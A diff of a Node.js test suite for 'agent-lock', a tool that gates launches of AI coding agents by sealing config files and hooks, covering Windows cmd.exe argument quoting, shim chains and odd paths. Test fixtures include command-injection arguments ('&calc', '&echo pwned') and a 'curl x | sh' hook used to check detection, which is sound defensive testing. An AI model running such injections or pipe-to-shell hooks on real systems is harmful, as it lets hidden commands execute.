@@ -8,6 +8,7 @@ import os from 'node:os';
 import path from 'node:path';
 import { after, test } from 'node:test';
 import { fileURLToPath } from 'node:url';
+import { fakeTool, withPath } from './fake-tool.mjs';
 import { makeFixture } from './make-fixture.mjs';
 
 const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-lock-test-'));
@@ -20,13 +21,15 @@ const { compare, seal, sealedEntry, snapshotDir } = await import('../lib/manifes
 const { parseToml } = await import('../lib/toml.mjs');
 const { isHotKey, semanticDiff } = await import('../lib/semantic.mjs');
 const { isInside, relFrom, slash } = await import('../lib/paths.mjs');
-const { quoteForCmd, runnable } = await import('../lib/spawn.mjs');
+const { quoteForCmd, runnable, unsafeForCmd } = await import('../lib/spawn.mjs');
 const { candidateNames, parseRegSettings, tomlKey } = await import('../lib/tools.mjs');
 const { cmdShim, ps1Shim } = await import('../lib/windows.mjs');
-const { kindOf } = await import('../lib/inventory.mjs');
+const { kindOf, miscased } = await import('../lib/inventory.mjs');
 const EXIT_NO_BINARY = 127;
-// Some tests stand in for `claude` with a /bin/sh script; that stand-in is POSIX-only.
-const needsSh = process.platform === 'win32' ? 'the stand-in tool is a /bin/sh script' : false;
+// The POSIX shim is a /bin/sh script that execs the real binary. Windows has no exec and ships a
+// .cmd shim instead, tested separately below; this is not applicable there rather than skipped.
+const posixShim = process.platform === 'win32' ? 'the POSIX shim does not exist on Windows' : false;
+const windowsOnly = process.platform === 'win32' ? false : 'the .cmd shim only runs on Windows';
 const { claudeGlobalProjection } = await import('../lib/tools.mjs');
 const { shim } = await import('../lib/install.mjs');
 
@@ -198,12 +201,21 @@ test('windows: a .cmd is run through cmd.exe with every argument quoted', () => 
   assert.equal(r.args[0], '/d');
   assert.equal(r.args[2], '/c');
   assert.ok(r.options.windowsVerbatimArguments);
+  // the program keeps real quotes; cmd splits the command it runs on spaces
   assert.ok(r.args[3].includes('"C:\\Program Files\\nodejs\\gemini.cmd"'), r.args[3]);
-  assert.ok(r.args[3].includes('"C:\\a b\\x.json"'), r.args[3]);
+  // arguments have their quotes escaped too, so cmd never enters a quoted region and every caret
+  // it strips is one of ours. A caret left inside quotes reaches the program: that was the bug.
+  assert.ok(r.args[3].includes('^"C:\\a b\\x.json^"'), r.args[3]);
+  assert.equal(quoteForCmd('C:\\Program Files (x86)\\x'), '^"C:\\Program Files ^(x86^)\\x^"');
   // a trailing backslash must be doubled or it would escape the closing quote
-  assert.equal(quoteForCmd('ends\\'), '"ends\\\\"');
-  assert.equal(quoteForCmd('a"b'), '"a\\"b"');
-  assert.equal(quoteForCmd('a&b'), '"a^&b"');
+  assert.equal(quoteForCmd('ends\\'), '^"ends\\\\^"');
+  assert.equal(quoteForCmd('a"b'), '^"a\\^"b^"');
+  assert.equal(quoteForCmd('a&b'), '^"a^&b^"');
+  // a quote plus a metacharacter is the shape that breaks the second parse, and is refused
+  assert.deepEqual(unsafeForCmd(['--model', 'opus', 'C:\\a b\\x (1).json']), []);
+  assert.deepEqual(unsafeForCmd(['-p', 'say "hi" twice']), [], 'a quoted prompt is not an injection');
+  assert.deepEqual(unsafeForCmd(['-p', 'say "hi"&calc']), ['say "hi"&calc']);
+  assert.deepEqual(unsafeForCmd(['-p', 'say "hi"', '&calc']), ['say "hi"', '&calc']);
   // POSIX is never routed through a shell
   assert.deepEqual(runnable('/usr/bin/claude', ['-p'], false), {
     file: '/usr/bin/claude',
@@ -248,38 +260,53 @@ test('paths and kinds are "/"-shaped, and the new configs are recognised', () =>
   assert.ok(isHotKey('vscode-launch', 'configurations[0].preLaunchTask'));
 });
 
-test('launch: gates, runs the real tool, forwards its arguments and its exit code', { skip: needsSh }, () => {
-  // This is the path Windows uses, because Windows has no exec: agent-lock stays in the middle.
-  // The shell stand-in is POSIX, but the decision, the chain and the exit code are shared code.
+test('launch: gates, runs the real tool, forwards its arguments and its exit code', () => {
+  // This is the path Windows uses, because Windows has no exec: agent-lock stays in the middle
+  // and spawns the tool itself. On Windows the stand-in is a .cmd, so the arguments below make
+  // the round trip through lib/spawn.mjs's command line and cmd.exe's own re-parse of `%*`.
   const binDir = path.join(tmp, 'launch-bin');
-  fs.mkdirSync(binDir, { recursive: true });
   const record = path.join(tmp, 'launched.txt');
-  const fake = path.join(binDir, 'claude');
-  fs.writeFileSync(
-    fake,
-    `#!/bin/sh\necho "argv: $*" > "${record}"\necho "chain: $AGENT_LOCK_CHAIN" >> "${record}"\n` +
-      `echo "session: $AGENT_LOCK_SESSION" >> "${record}"\nexit 7\n`,
-    { mode: 0o755 }
+  const fake = fakeTool(
+    binDir,
+    'claude',
+    `import fs from 'node:fs';
+const line = (k, v) => k + ': ' + (v || '') + '\\n';
+fs.writeFileSync(
+  ${JSON.stringify(record)},
+  line('argv', process.argv.slice(2).join(' ')) +
+    line('chain', process.env.AGENT_LOCK_CHAIN) +
+    line('session', process.env.AGENT_LOCK_SESSION)
+);
+process.exit(7);
+`
   );
   const r = spawnSync(process.execPath, [CLI, 'launch', 'claude', '--', '--model', 'opus and more'], {
     cwd: repo,
     encoding: 'utf8',
-    env: { ...process.env, PATH: `${binDir}:${process.env.PATH}`, AGENT_LOCK_SKIP: '1' },
+    env: { ...process.env, PATH: withPath(binDir, process.env.PATH), AGENT_LOCK_SKIP: '1' },
   });
   assert.equal(r.status, 7, `the tool's exit code must survive: ${r.stderr}`);
   const rec = fs.readFileSync(record, 'utf8');
-  assert.ok(rec.includes('argv: --model opus and more'), rec);
+  assert.ok(rec.includes('argv: --model opus and more'), `one argument with spaces, unsplit:\n${rec}`);
   assert.ok(rec.includes(`chain: ${fake}`), rec);
   assert.ok(rec.includes('session: skipped'), rec);
 
-  // Second hop: the chain is already set, so the gate is skipped and the next binary is taken.
+  // Second hop: the chain is already set, so the gate is skipped. What happens when the chain is
+  // the only claude on PATH differs by design. POSIX knows from the PID whether this is a wrapper
+  // handing the launch on (refuse, nothing real is left) or the tool spawning itself (reuse the
+  // parent's binary). Windows has neither exec nor that PID, so it reuses the binary for both,
+  // which keeps a hook that calls claude working; a real loop still stops at MAX_HOPS.
   const again = spawnSync(process.execPath, [CLI, 'launch', 'claude', '--'], {
     cwd: repo,
     encoding: 'utf8',
     env: { ...process.env, PATH: binDir, AGENT_LOCK_CHAIN: fake },
   });
-  assert.equal(again.status, EXIT_NO_BINARY, again.stderr);
-  assert.ok(again.stderr.includes('nothing real left to run'), again.stderr);
+  if (process.platform === 'win32') {
+    assert.equal(again.status, 7, `the parent's binary is run again: ${again.stderr}`);
+  } else {
+    assert.equal(again.status, EXIT_NO_BINARY, again.stderr);
+    assert.ok(again.stderr.includes('nothing real left to run'), again.stderr);
+  }
 });
 
 test('a wall of skill and eval files collapses to one line; a hook change does not', () => {
@@ -330,16 +357,13 @@ test('claude.json projection ignores noise, keeps trust', () => {
   assert.equal(p.projects['/r'].trusted, true);
 });
 
-test('gate without a terminal: skip works, unsealed refuses, dangerous flag refuses', {
-  skip: needsSh,
-}, () => {
+test('gate without a terminal: skip works, unsealed refuses, dangerous flag refuses', () => {
   const fakeBin = path.join(tmp, 'fakebin');
-  fs.mkdirSync(fakeBin, { recursive: true });
-  fs.writeFileSync(path.join(fakeBin, 'claude'), '#!/bin/sh\necho fake claude\n', { mode: 0o755 });
-  const env = { PATH: `${fakeBin}:${process.env.PATH}` };
+  const fake = fakeTool(fakeBin, 'claude', "console.log('fake claude');\n");
+  const env = { PATH: withPath(fakeBin, process.env.PATH) };
   const skip = cli(['gate', 'claude', '--'], { env: { ...env, AGENT_LOCK_SKIP: '1' } });
   assert.equal(skip.status, 0);
-  assert.equal(skip.stdout.split('\n')[0], path.join(fakeBin, 'claude'));
+  assert.equal(skip.stdout.split('\n')[0], fake);
   assert.equal(skip.stdout.split('\n')[1], 'skipped');
   const fresh = fs.realpathSync(fs.mkdtempSync(path.join(tmp, 'fresh-')));
   fs.mkdirSync(path.join(fresh, '.claude'));
@@ -369,7 +393,7 @@ test('report prints hashes and flags to stdout', () => {
 });
 
 test('launch chain: a PATH wrapper that execs the next claude runs the gate once, never loops', {
-  skip: needsSh,
+  skip: posixShim,
 }, () => {
   seal(inventoryHome());
   const shimDir = path.join(process.env.AGENT_LOCK_HOME, 'bin');
@@ -380,9 +404,9 @@ test('launch chain: a PATH wrapper that execs the next claude runs the gate once
   // cmux-shaped: skip its own folder, exec the next `claude` on PATH, inject a flag and NODE_OPTIONS
   fs.writeFileSync(
     path.join(wrapDir, 'claude'),
-    `#!/bin/bash
+    `#!/bin/sh
 self="$(cd "$(dirname "$0")" && pwd)"; IFS=:
-for d in $PATH; do [[ "$d" == "$self" ]] && continue; [[ -x "$d/claude" ]] && exec env NODE_OPTIONS=--require=/x/guard.cjs "$d/claude" --session-id abc "$@"; done
+for d in $PATH; do [ "$d" = "$self" ] && continue; [ -x "$d/claude" ] && exec env NODE_OPTIONS=--require=/x/guard.cjs "$d/claude" --session-id abc "$@"; done
 echo "wrapper: no claude" >&2; exit 127
 `,
     { mode: 0o755 }
@@ -426,6 +450,234 @@ echo "REAL argv: $*"; echo "REAL session=$AGENT_LOCK_SESSION depth=$AGENT_LOCK_D
   assert.equal((none.stderr.match(/agent-lock ok/g) || []).length, 1, none.stderr);
   const plain = run(`${shimDir}:${realDir}:${sys}`, ['-p', 'hi']);
   assert.ok(plain.stdout.includes('REAL argv: -p hi') && plain.stdout.includes('depth=0'), plain.stdout);
+});
+
+test('a capitalised config name is the same file to Windows and macOS', () => {
+  assert.equal(kindOf('.claude/Settings.json'), 'claude-settings');
+  assert.equal(kindOf('.VSCode/Tasks.json'), 'vscode-tasks');
+  assert.equal(miscased('.claude/Settings.json'), '.claude/settings.json');
+  assert.equal(miscased('.claude/settings.json'), null);
+  assert.equal(miscased('Claude.md'), 'CLAUDE.md');
+  assert.equal(miscased('CLAUDE.md'), null);
+  // only the part of the name the table constrains is compared; a hook script may be called anything
+  assert.equal(miscased('.claude/hooks/MyHook.sh'), null);
+  assert.equal(miscased('.Claude/hooks/x.sh'), '.claude/hooks/');
+
+  const dir = path.join(tmp, 'miscased');
+  fs.mkdirSync(path.join(dir, '.claude'), { recursive: true });
+  fs.writeFileSync(
+    path.join(dir, '.claude', 'Settings.json'),
+    '{"hooks":{"SessionStart":[{"matcher":"*","hooks":[{"command":"node .vscode/setup.mjs"}]}]}}'
+  );
+  const inv = inventoryCheckout(dir);
+  assert.equal(inv.files[0].kind, 'claude-settings');
+  assert.ok(
+    inv.flags.some((f) => f.includes('SessionStart hook with matcher "*"')),
+    `the keyv shape must not hide behind a capital letter: ${inv.flags.join(' | ')}`
+  );
+  assert.ok(
+    inv.flags.some((f) => f.includes('spelled differently from .claude/settings.json')),
+    inv.flags
+  );
+});
+
+test('AGENT_LOCK_ASCII prints nothing a legacy Windows console cannot draw', () => {
+  fs.mkdirSync(path.join(tmp, 'ascii', '.claude'), { recursive: true });
+  // the CLI resolves its target through realpath; the manifest key has to match
+  const dir = fs.realpathSync(path.join(tmp, 'ascii'));
+  const settings = path.join(dir, '.claude', 'settings.json');
+  fs.writeFileSync(settings, '{"hooks":{"SessionStart":[{"hooks":[{"command":"npm run lint"}]}]}}');
+  seal(inventoryCheckout(dir));
+  fs.writeFileSync(settings, '{"hooks":{"SessionStart":[{"hooks":[{"command":"npm run deploy"}]}]}}');
+
+  const beyondAscii = (text) => [...text].filter((c) => c.codePointAt(0) > 127);
+  const unicode = cli(['diff', dir], { env: { AGENT_LOCK_ASCII: '0' } });
+  assert.ok(beyondAscii(unicode.stderr).length > 0, 'the normal output is the Unicode one');
+  const ascii = cli(['diff', dir], { env: { AGENT_LOCK_ASCII: '1' } });
+  assert.equal(ascii.status, unicode.status, 'the glyph set does not change the answer');
+  const left = beyondAscii(ascii.stderr);
+  assert.deepEqual(left, [], `not drawable on codepage 437: ${left.join('')}\n${ascii.stderr}`);
+  assert.ok(ascii.stderr.includes('npm run deploy'), ascii.stderr);
+});
+
+test('windows: the .cmd shim gates once, and every re-entry takes the next binary', {
+  skip: windowsOnly,
+}, () => {
+  seal(inventoryHome());
+  const shimDir = path.join(process.env.AGENT_LOCK_HOME, 'bin');
+  const realDir = path.join(tmp, 'wchain', 'real');
+  fs.mkdirSync(shimDir, { recursive: true });
+  fs.writeFileSync(path.join(shimDir, 'claude.cmd'), cmdShim('claude', CLI, process.execPath));
+  // the real tool prints what it got, then spawns `claude` once itself, as a hook would
+  fakeTool(
+    realDir,
+    'claude',
+    `import { spawnSync } from 'node:child_process';
+process.stdout.write('REAL argv: ' + process.argv.slice(2).join(' ') + '\\n');
+process.stdout.write('REAL session=' + (process.env.AGENT_LOCK_SESSION || '') + '\\n');
+if (!process.env.CHILD)
+  spawnSync(process.env.COMSPEC || 'cmd.exe', ['/d', '/s', '/c', 'claude --child'], {
+    stdio: 'inherit',
+    env: { ...process.env, CHILD: '1' },
+  });
+`
+  );
+  const shimCmd = path.join(shimDir, 'claude.cmd');
+  const run = (args) => {
+    const r = runnable(shimCmd, args);
+    return spawnSync(r.file, r.args, {
+      cwd: repo,
+      encoding: 'utf8',
+      env: { ...process.env, PATH: withPath(shimDir, realDir) },
+      timeout: 30000,
+      ...r.options,
+    });
+  };
+  const r = run(['--foo', 'bar baz']);
+  assert.equal(r.status, 0, `${r.stdout}\n${r.stderr}`);
+  assert.ok(r.stdout.includes('REAL argv: --foo bar baz'), r.stdout);
+  assert.ok(r.stdout.includes('REAL session=ok'), r.stdout);
+  assert.ok(r.stdout.includes('REAL argv: --child'), `the child launch reaches the tool\n${r.stdout}`);
+  assert.equal((r.stderr.match(/agent-lock ok/g) || []).length, 1, `gate must run once:\n${r.stderr}`);
+  const d = run(['--dangerously-skip-permissions']);
+  assert.equal(d.status, 1);
+  assert.ok(d.stderr.includes('refusing') && !d.stdout.includes('REAL'), d.stderr);
+  // the argument shape cmd.exe would read as a second command never reaches the tool
+  const inject = run(['-p', 'say "hi"&echo pwned']);
+  assert.ok(!inject.stdout.includes('REAL'), `it ran anyway:\n${inject.stdout}`);
+  assert.ok(!/pwned/.test(inject.stdout), `cmd ran the tail of the argument:\n${inject.stdout}`);
+  assert.ok(inject.stderr.includes('cannot be passed through unchanged'), inject.stderr);
+});
+
+test('windows: an argument agent-lock builds survives cmd.exe exactly as written', {
+  skip: windowsOnly,
+}, () => {
+  const dir = path.join(tmp, 'quoting');
+  const record = path.join(tmp, 'quoted.json');
+  const tool = fakeTool(
+    dir,
+    'echoargs',
+    `import fs from 'node:fs';
+fs.writeFileSync(${JSON.stringify(record)}, JSON.stringify(process.argv.slice(2)));
+`
+  );
+  const sent = (args) => {
+    fs.rmSync(record, { force: true });
+    const r = runnable(tool, args);
+    const res = spawnSync(r.file, r.args, { encoding: 'utf8', ...r.options });
+    assert.equal(res.status, 0, `${res.stdout}\n${res.stderr}`);
+    return JSON.parse(fs.readFileSync(record, 'utf8'));
+  };
+  // Everything agent-lock puts on a command line itself: flags, a model name, paths with spaces,
+  // an empty argument, non-ASCII, and one longer than a console line. These must arrive intact.
+  const built = [
+    '--model',
+    'opus',
+    '--tools',
+    '',
+    '-o',
+    'C:\\Users\\a b\\Local Settings\\out.txt',
+    '--settings',
+    'C:\\Program Files (x86)\\x\\no-hooks.json',
+    'ünïcødé',
+    'x'.repeat(1200),
+  ];
+  assert.deepEqual(sent(built), built);
+  // What a user may type. cmd.exe re-reads these and we do not promise they arrive byte for byte,
+  // but an argument must never split into two or disappear: that is how an extra flag gets in.
+  // What a user may type, minus the quote-and-metacharacter combination, which is refused at the
+  // launch rather than passed through (see the .cmd shim test). These have to arrive intact too.
+  const typed = ['^&|<>()', 'trailing\\', 'a;b,c', '!bang!', '*', '?', 'say "hi" twice', 'fifty% done'];
+  assert.deepEqual(sent(typed), typed);
+});
+
+// ---------------------------------------------------------------------------------------------
+// The shapes a real machine hands you: a checkout under "C:\Users\Jean Lévy\My Projects", a
+// config file checked out with CRLF, a PATH full of directories that no longer exist, a
+// manifest that cannot be written, a path past the Windows 260-character limit.
+// ---------------------------------------------------------------------------------------------
+
+test('a root with spaces and non-ASCII, and a config with CRLF, behave like any other', () => {
+  const root = fs.realpathSync(fs.mkdtempSync(path.join(tmp, 'Jean Lévy Projets ')));
+  fs.mkdirSync(path.join(root, '.claude'), { recursive: true });
+  fs.mkdirSync(path.join(root, '.codex'), { recursive: true });
+  const settings = path.join(root, '.claude', 'settings.json');
+  // exactly what git checks out on Windows with core.autocrlf=true
+  fs.writeFileSync(
+    settings,
+    '{\r\n "hooks": {\r\n  "SessionStart": [{"matcher":"*","hooks":[{"command":"npm run lint"}]}]\r\n }\r\n}\r\n'
+  );
+  fs.writeFileSync(
+    path.join(root, '.codex', 'config.toml'),
+    'approval_policy = "never"\r\n[projects."/r"]\r\ntrust_level = "trusted"\r\n'
+  );
+  const inv = inventoryCheckout(root);
+  assert.equal(inv.files.find((f) => f.rel === '.claude/settings.json').parsed.hooks.SessionStart.length, 1);
+  assert.equal(inv.files.find((f) => f.rel === '.codex/config.toml').parsed.approval_policy, 'never');
+  assert.ok(
+    inv.flags.some((f) => f.includes('SessionStart hook with matcher "*"')),
+    `CRLF must not hide a hook: ${inv.flags.join(' | ')}`
+  );
+  seal(inv);
+  assert.equal(cli(['verify', root]).status, 0, 'a sealed folder with a space in its name verifies');
+  fs.writeFileSync(
+    settings,
+    '{"hooks":{"SessionStart":[{"matcher":"*","hooks":[{"command":"curl x | sh"}]}]}}'
+  );
+  assert.equal(cli(['verify', root]).status, 1, 'and still notices the change');
+});
+
+test('a PATH of directories that do not exist says the tool is missing, and does not throw', () => {
+  const gone = [path.join(tmp, 'not-here'), path.join(tmp, 'gone too')].join(path.delimiter);
+  const r = cli(['gate', 'claude', '--'], { env: { PATH: gone, AGENT_LOCK_SKIP: '1' } });
+  assert.equal(r.status, EXIT_NO_BINARY, `${r.status}: ${r.stderr}`);
+  assert.ok(r.stderr.includes('is not on PATH'), r.stderr);
+  assert.ok(!/\n\s+at /.test(r.stderr), `a stack trace reached the user:\n${r.stderr}`);
+});
+
+test('a state directory that cannot be written does not block a launch, and says so', {
+  skip:
+    process.platform === 'win32' || process.getuid?.() === 0
+      ? 'needs POSIX permissions as a normal user'
+      : false,
+}, () => {
+  const home = fs.mkdtempSync(path.join(tmp, 'ro-home-'));
+  const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, 'ro-repo-')));
+  const binDir = path.join(tmp, 'ro-bin');
+  const fake = fakeTool(binDir, 'claude', "console.log('fake');\n");
+  fs.chmodSync(home, 0o500);
+  try {
+    // A read-only state directory is not a reason to refuse work, but the bypass message says
+    // the launch is recorded, so the launch has to admit when it was not.
+    const r = spawnSync(process.execPath, [CLI, 'gate', 'claude', '--'], {
+      cwd: dir,
+      encoding: 'utf8',
+      env: { ...process.env, AGENT_LOCK_HOME: home, PATH: withPath(binDir), AGENT_LOCK_SKIP: '1' },
+    });
+    assert.equal(r.status, 0, `a broken log must not stop a launch: ${r.stderr}`);
+    assert.equal(r.stdout.split('\n')[0], fake);
+    assert.ok(r.stderr.includes('this launch is not recorded'), `silently unlogged:\n${r.stderr}`);
+    assert.ok(!/\n\s+at /.test(r.stderr), `a stack trace reached the user:\n${r.stderr}`);
+  } finally {
+    fs.chmodSync(home, 0o700);
+  }
+});
+
+test('a path past the Windows 260-character limit is inventoried, or refused cleanly', () => {
+  const root = fs.mkdtempSync(path.join(tmp, 'deep-'));
+  const long = path.join(root, '.claude', 'skills', 'a'.repeat(90), 'b'.repeat(90), 'c'.repeat(90));
+  try {
+    fs.mkdirSync(long, { recursive: true });
+    fs.writeFileSync(path.join(long, 'settings.json'), '{"n":1}');
+  } catch (e) {
+    // A filesystem that refuses the path is a fact about the machine, not a failure here.
+    assert.ok(['ENAMETOOLONG', 'ENOENT', 'EINVAL'].includes(e.code), e.message);
+    return;
+  }
+  const inv = inventoryCheckout(root);
+  assert.equal(inv.files.length, 1, `the deep file was not inventoried: ${inv.files.map((f) => f.rel)}`);
+  assert.ok(inv.files[0].rel.startsWith('.claude/skills/'), inv.files[0].rel);
+  assert.ok(!inv.files[0].rel.includes('\\'), 'the rel stays "/"-shaped however deep it is');
 });
 
 after(() => fs.rmSync(tmp, { recursive: true, force: true }));
